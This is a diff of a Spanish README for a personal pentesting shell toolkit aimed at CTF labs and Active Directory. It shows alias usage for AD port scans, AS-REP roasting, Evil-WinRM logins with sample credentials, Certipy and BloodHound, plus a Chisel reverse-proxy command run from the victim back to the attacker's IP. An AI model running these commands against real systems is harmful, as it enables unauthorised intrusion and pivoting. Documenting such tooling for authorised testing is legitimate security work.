@@ -1,155 +1,123 @@
-# 🧰 Arsenal de Neenah v7.0 (Speedrun Edition)
+# Hacking Operations Toolkit v1.0 (Speedrun Edition)
 
-```
-  _   _  ______ ______  _   _   __  __ 
- | \ | ||  ____||  ____|| \ | | |  \/  |
- |  \| || |__   | |__   |  \| | | \  / |
- | . ` ||  __|  |  __|  | . ` | | |\/| |
- | |\  || |____ | |____ | |\  | | |  | |
- |_| \_||______||______||_| \_| |_|  |_|
-```
-*// Un toolkit de shell optimizado para la ejecución rápida en operaciones de pentesting, con un fuerte enfoque en Linux y Active Directory.*
+![Version](https://img.shields.io/badge/Version-v1.0-blue.svg)
+![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)
+![Platform](https://img.shields.io/badge/Platform-Kali%20Linux-lightgrey.svg)
+![Maintained](https://img.shields.io/badge/Maintained%3F-yes-brightgreen.svg)
+
+> Un kit de herramientas de shell optimizado para la ejecución rápida en operaciones de pentesting, con un fuerte enfoque en Linux y Active Directory.
+
+Este repositorio centraliza una colección de alias y funciones de shell (`bash`/`zsh`) diseñadas para automatizar y acelerar las tareas más comunes y repetitivas durante una auditoría de seguridad o la resolución de máquinas en plataformas CTF.
+
+---
+
+## Índice
+
+1.  [📜 Descripción](#-descripción)
+2.  [✨ Características Clave](#-características-clave)
+3.  [⚡ Instalación y Configuración](#-instalación-y-configuración)
+4.  [🛠️ Guía de Uso Táctico](#️-guía-de-uso-táctico)
+5.  [🤝 Contribuciones](#-contribuciones)
+6.  [📄 Licencia](#-licencia)
+7.  [⚠️ Advertencia Ética](#️-advertencia-ética)
 
 ---
 
 ## 📜 Descripción
 
-Este repositorio es mi arsenal personal y centralizado de alias y funciones de shell (`bash`/`zsh`). Está diseñado para acelerar drásticamente las tareas repetitivas en entornos de CTF y laboratorios (Hack The Box, TryHackMe, etc.). El objetivo es simple: menos tipeo, más hacking.
+El objetivo de este toolkit es minimizar el tiempo de tipeo y maximizar el tiempo dedicado al análisis y la explotación. El arsenal es modular, lo que permite añadir o quitar herramientas fácilmente, y está diseñado para ser cargado automáticamente al iniciar una nueva sesión de terminal en Kali Linux.
 
----
+## ✨ Características Clave
 
-## ⚡ Instalación y Configuración (Kali Linux)
+- **Modular y Organizado:** Las herramientas están agrupadas por función en scripts separados para un fácil mantenimiento.
+- **Optimizado para Velocidad:** Los alias son cortos, mnemotécnicos y diseñados para las operaciones más frecuentes.
+- **Enfoque en AD:** Incluye un conjunto completo de atajos para las herramientas más importantes de pentesting en Active Directory (`Impacket`, `NetExec`, `Certipy`, `BloodHound`, etc.).
+- **Flexible:** Las funciones aceptan argumentos para adaptarse a diferentes objetivos y escenarios sin necesidad de modificar el código.
+- **Fácil de Instalar:** Configuración rápida con un solo comando para integrar el toolkit en tu shell.
 
-Este kit está diseñado y probado para **Kali Linux**. Para usarlo en otras distribuciones, puede que necesites instalar dependencias adicionales.
+## ⚡ Instalación y Configuración
+
+Este kit está diseñado y probado para **Kali Linux**.
+
+### Requisitos Previos
+
+Asegúrate de tener las siguientes herramientas instaladas.
+
+```bash
+# Herramientas del sistema
+sudo apt update && sudo apt install -y git zsh python3-pip xclip neo4j
+
+# Herramientas de Python (se instalarán con el siguiente paso)
+```
 
 ### Paso 1: Clonar el Repositorio
-Clona este repositorio en una ubicación fácil de recordar, como tu directorio de inicio.
+Clona este repositorio en una ubicación permanente, como tu directorio de inicio.
 ```bash
 git clone [https://github.com/iNeenah/Hacking-Set-Up.git](https://github.com/iNeenah/Hacking-Set-Up.git) ~/hacking-toolkit
+cd ~/hacking-toolkit
 ```
 
-### Paso 2: Instalar Dependencias
-El arsenal depende de varias herramientas clave. La mayoría ya vienen en Kali, pero nos aseguramos de tener todo.
+### Paso 2: Instalar Dependencias de Python
+El arsenal depende de varias librerías de Python. Instálalas usando el archivo `requirements.txt` incluido.
 ```bash
-# Actualiza e instala herramientas del sistema
-sudo apt update && sudo apt install -y zsh git xclip python3-pip neo4j
-
-# Instala herramientas de Python
-# (Se recomienda hacerlo dentro de un entorno virtual de Python)
-python3 -m pip install --user -r requirements.txt 
-# Nota: Deberás crear un archivo 'requirements.txt' con el contenido:
-# impacket, bloodhound, certipy-ad, netexec, coercer
+python3 -m pip install --user -r requirements.txt
 ```
 
-### Paso 3: Cargar en la Shell
-Añade el script principal a la configuración de tu shell para que se cargue automáticamente cada vez que abres una nueva terminal.
+### Paso 3: Configurar el Entorno
+Añade el script principal a la configuración de tu shell para que se cargue automáticamente.
 
 ```bash
-# Este comando añade la línea 'source...' a tu archivo .zshrc
-echo -e "\n# Cargar Arsenal de Neenah\nsource ~/hacking-toolkit/neenah_ad_toolkit.sh" >> ~/.zshrc
+# Añade la ruta de tu binario de Chisel a tu .zshrc (o .bashrc)
+# (Descarga Chisel desde su GitHub si no lo tienes)
+echo 'export CHISEL_PATH="~/tools/chisel"' >> ~/.zshrc
+
+# Añade el cargador del toolkit a tu .zshrc
+echo -e "\n# Cargar Hacking Operations Toolkit\nsource ~/hacking-toolkit/neenah_ad_toolkit.sh" >> ~/.zshrc
 
 # Aplica los cambios inmediatamente
 source ~/.zshrc
 ```
-¡Listo! Tu terminal ahora está sobrecargada.
+¡Listo! Tu terminal ahora está equipada con el arsenal completo.
 
----
+## 🛠️ Guía de Uso Táctico
 
-## 🛠️ Guía de Uso del Arsenal
+A continuación, algunos ejemplos de uso de los alias más potentes.
 
-### ➤ Utilidades Generales
-
-#### `serve <puerto>`
-Inicia un servidor web Python3 en el directorio actual. Útil para servir exploits o exfiltrar archivos.
+#### Módulo de Reconocimiento
 ```bash
-┌──(neenah㉿kali)-[~/www]
-└─$ serve 8000
-[+] Sirviendo en [http://0.0.0.0:8000](http://0.0.0.0:8000) ...
-Serving HTTP on 0.0.0.0 port 8000 ([http://0.0.0.0:8000/](http://0.0.0.0:8000/)) ...
+# Escaneo rápido de puertos comunes de AD en un objetivo
+scan-ad 10.10.11.150
+
+# Fuzzing de directorios en un servidor web
+fuzz [http://10.10.11.150/FUZZ](http://10.10.11.150/FUZZ)
 ```
 
-#### `listen <puerto>`
-Inicia un listener de `nc` para recibir reverse shells.
+#### Módulo de Active Directory
 ```bash
-┌──(neenah㉿kali)-[~]
-└─$ listen 4444
-[+] Escuchando en puerto 4444...
-listening on [any] 4444 ...
+# Buscar usuarios vulnerables a AS-REP Roasting
+asrep 10.10.11.150 mydomain.local
+
+# Obtener una shell interactiva con credenciales
+ewinrm 10.10.11.150 'svc_user' 'P@ssw0rd123!'
+
+# Encontrar plantillas de certificados vulnerables
+cp-find 'mydomain.local/svc_user:P@ssw0rd123!' -dc-ip 10.10.11.150
 ```
 
-#### `tunip`
-Copia la IP de tu interfaz `tun0` (VPN de HTB) directamente a tu portapapeles.
+#### Módulo de Pivoting
 ```bash
-┌──(neenah㉿kali)-[~]
-└─$ tunip
-[+] IP de tun0 [10.10.14.49] copiada.
+# Iniciar un servidor Chisel para un proxy reverso
+pivot server
+
+# En la shell de la víctima, el siguiente comando ya estará en tu portapapeles:
+# ./chisel client <TU_IP>:8888 R:socks
 ```
 
-### ➤ Reconocimiento
+## 🤝 Contribuciones
+Este es un proyecto personal, pero las sugerencias y pull requests para mejorar las herramientas son bienvenidas.
 
-#### `scan-ad <IP>`
-Lanza un escaneo `nmap` optimizado para los puertos más comunes de Active Directory.
-```bash
-┌──(neenah㉿kali)-[~]
-└─$ scan-ad 10.10.11.100
-[+] Escaneando AD en 10.10.11.100...
-Starting Nmap...
-...
-[+] Escaneo de AD guardado en 10.10.11.100/nmap/ad_scan.nmap
-```
-
-### ➤ Active Directory: Enumeración y Ataques
-
-#### `kb-users <IP_DC> <dominio> <lista>`
-Enumera usuarios de forma segura usando Kerbrute.
-```bash
-┌──(neenah㉿kali)-[~]
-└─$ kb-users 10.10.11.100 sorcery.htb users.txt
-...
-2025/06/23 03:13:37 [+] VALID USERNAME:	 tom_summers@sorcery.htb
-...
-```
-
-#### `asrep-roast <IP_DC> <dominio>`
-Busca usuarios vulnerables a AS-REP Roasting.
-```bash
-┌──(neenah㉿kali)-[~]
-└─$ asrep 10.10.11.100 sorcery.htb
-Impacket v0.12.0 ...
-$krb5asrep$23$svc_user@sorcery.htb:d1a2...
-[+] Hashes para crackear guardados en asrep_hashes.txt
-```
-
-#### `ewinrm <IP> <user> '<pass>'`
-Inicia una shell interactiva de PowerShell con Evil-WinRM.
-```bash
-┌──(neenah㉿kali)-[~]
-└─$ ewinrm 10.10.11.150 tom_summers 'P@ssw0rd123!'
-...
-*Evil-WinRM* PS C:\Users\tom_summers\Documents>
-```
-
-### ➤ BloodHound
-
-#### `bh <start|stop>`
-Inicia o detiene los servicios de BloodHound (base de datos Neo4j y la GUI).
-```bash
-┌──(neenah㉿kali)-[~]
-└─$ bh start
-...
-[+] Iniciando Neo4j y BloodHound GUI...
-```
-
-#### `bh-collect <user> '<pass>' <IP_DC> <dominio>`
-Lanza el colector para mapear el dominio.
-```bash
-┌──(neenah㉿kali)-[~]
-└─$ bh-collect tom_summers 'P@ssw0rd123!' 10.10.11.100 sorcery.htb
-[+] Colección de BloodHound completada. Importa los archivos .json a la GUI.
-```
-
----
+## 📄 Licencia
+Este proyecto está bajo la Licencia MIT. Ver el archivo `LICENSE` para más detalles.
 
 ## ⚠️ Advertencia Ética
-
 Este toolkit está diseñado con fines **educativos y para su uso en entornos de hacking ético autorizados** (CTFs, laboratorios personales, auditorías con consentimiento explícito). El uso de estas herramientas en sistemas sin permiso es ilegal. Opera con profesionalismo y responsabilidad.
